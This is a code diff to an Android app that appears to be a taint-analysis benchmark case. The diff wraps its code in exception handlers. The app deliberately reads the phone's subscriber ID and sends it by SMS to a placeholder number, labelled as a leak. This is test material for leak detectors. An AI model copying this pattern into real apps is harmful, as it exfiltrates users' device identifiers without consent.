@@ -17,6 +17,7 @@ import android.telephony.TelephonyManager;
  * @number_of_leaks 1
  * @challenges the analysis must be able to handle the activity lifecycle correctly,
  *  in particular the less common instanceState callbacks
+	*  ADAPACIONES: catch NullPointerException ClassCastException
  */
 public class MainActivity extends Activity {
 	public String s;
@@ -29,13 +30,18 @@ public class MainActivity extends Activity {
     
     @Override
 	public void onSaveInstanceState(Bundle outState){
-		 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-		s = telephonyManager.getSubscriberId(); //source
-	}
+		 try{
+							TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+							s = telephonyManager.getSubscriberId(); //source
+       }catch(NullPointerException e){
+							}catch(ClassCastException ignore){}				
+				}
 	
 	@Override 
 	public void onRestoreInstanceState(Bundle outState){
-		SmsManager sms = SmsManager.getDefault();
+		try{
+								SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage("+49 1234", null, s, null, null); //sink, leak
+						}catch(NullPointerException e){}
 	}
 }
